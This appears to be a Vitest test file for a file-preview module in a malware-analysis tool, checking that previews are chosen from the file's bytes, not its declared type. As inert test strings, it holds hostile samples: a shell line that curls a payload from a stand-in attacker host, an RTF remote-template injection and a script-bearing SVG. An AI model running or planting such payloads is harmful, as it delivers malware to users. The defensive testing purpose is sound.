import { describe, expect, it } from 'vitest'
import { drawableType, hexDump, imageDataUrl, previewKind, previewText } from './preview'

const bytes = (...b: number[]) => Uint8Array.from(b)
const PNG = bytes(0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 1, 2, 3)

describe('previewKind', () => {
  it('draws a raster image only when the BYTES say so', () => {
    expect(previewKind('application/octet-stream', 'whatever.bin', 'PNG image', PNG)).toBe('image')
  })

  it('will not draw a file just because it is named or declared an image', () => {
    // The whole point: a .png that begins MZ is a Windows executable.
    const mz = bytes(0x4d, 0x5a, 0x90, 0x00)
    expect(previewKind('image/png', 'logo.png', 'Windows executable (MZ)', mz)).toBe('binary')
    expect(previewKind('image/png', 'logo.png', '', mz)).toBe('binary')
  })

  it('reads SVG and HTML as source rather than drawing them', () => {
    // An image to a person, a script container to a browser.
    const svg = new TextEncoder().encode('<svg xmlns="http://www.w3.org/2000/svg"><script>x()</script></svg>')
    expect(previewKind('image/svg+xml', 'logo.svg', '', svg)).toBe('text')
    expect(previewKind('text/html', 'page.html', '', new TextEncoder().encode('<html></html>'))).toBe('text')
  })

  it('falls back to reading the bytes when nothing declares anything', () => {
    expect(previewKind('', '', '', new TextEncoder().encode('plain words here'))).toBe('text')
    expect(previewKind('', '', '', bytes(0, 1, 2, 3, 0, 255))).toBe('binary')
  })

  it('reads RTF and shebang scripts as source when their bytes are text', () => {
    // Both have a signature, and both are text: the \object and \*\template
    // an analyst needs are lost in a 512-byte hex dump.
    const rtf = new TextEncoder().encode('{\\rtf1{\\*\\template http://evil.example/t.dotm}{\\object\\objemb}}')
    expect(previewKind('application/rtf', 'x.rtf', 'RTF document', rtf)).toBe('text')
    const sh = new TextEncoder().encode('#!/bin/sh\ncurl -o /tmp/x http://evil.example/x\n')
    expect(previewKind('application/x-sh', 'run.sh', 'script with a shebang', sh)).toBe('text')
  })

  it('keeps a shebang stub glued to a binary payload as bytes, whatever it is declared as', () => {
    const stub = bytes(0x23, 0x21, 0x2f, 0x62, 0x69, 0x6e, 0x0a, 0, 0, 0, 0x7f, 0x45, 0x4c, 0x46)
    expect(previewKind('application/x-sh', 'run.sh', 'script with a shebang', stub)).toBe('binary')
  })
})

describe('imageDataUrl', () => {
  it('builds a data URL from the bytes, with the type the bytes imply', () => {
    const url = imageDataUrl(PNG, 'PNG image')
    expect(url.startsWith('data:image/png;base64,')).toBe(true)
    // Nothing remote: the whole image is carried in the URL itself.
    expect(url).not.toMatch(/https?:/)
  })

  it('refuses anything the bytes do not call a raster image', () => {
    expect(imageDataUrl(PNG, 'PDF')).toBe('')
    expect(imageDataUrl(new Uint8Array(0), 'PNG image')).toBe('')
  })

  it('does not overflow the stack on a large image', () => {
    const big = new Uint8Array(3_000_000)
    big.set(PNG.subarray(0, 8))
    expect(() => imageDataUrl(big, 'PNG image')).not.toThrow()
  })

  it('encodes every byte exactly, across the chunk boundaries', () => {
    // 70,000 bytes spans three 0x8000 chunks; every byte value appears.
    const pic = new Uint8Array(70_000).map((_, i) => (i * 131 + 7) & 0xff)
    pic.set(PNG.subarray(0, 8))
    let oneByOne = ''
    for (const b of pic) oneByOne += String.fromCharCode(b)
    expect(imageDataUrl(pic, 'PNG image')).toBe(`data:image/png;base64,${btoa(oneByOne)}`)
  })

  it('declines an image past the cap rather than building a huge string', () => {
    expect(imageDataUrl(new Uint8Array(9_000_000), 'PNG image')).toBe('')
  })
})

describe('drawableType', () => {
  it('maps only the three safe raster formats', () => {
    expect(drawableType('PNG image')).toBe('image/png')
    expect(drawableType('JPEG image')).toBe('image/jpeg')
    expect(drawableType('GIF image')).toBe('image/gif')
    expect(drawableType('PDF')).toBe('')
  })
})

describe('previewText and hexDump', () => {
  it('says when the text was cut', () => {
    const long = new TextEncoder().encode('a'.repeat(100))
    expect(previewText(long, 10)).toEqual({ text: 'aaaaaaaaaa', truncated: true })
    expect(previewText(long, 1000).truncated).toBe(false)
  })

  it('lays bytes out as offset, hex and ASCII', () => {
    // Raw bytes, not an encoded string: 0x90 is two bytes in UTF-8.
    const dump = hexDump(bytes(0x4d, 0x5a, 0x90, 0x00, 0x68, 0x65, 0x6c, 0x6c, 0x6f))
    expect(dump).toBe('00000000  4d 5a 90 00 68 65 6c 6c 6f                       |MZ..hello|')
  })

  it('stops at the limit', () => {
    expect(hexDump(new Uint8Array(1000), 32).split('\n')).toHaveLength(2)
  })
})
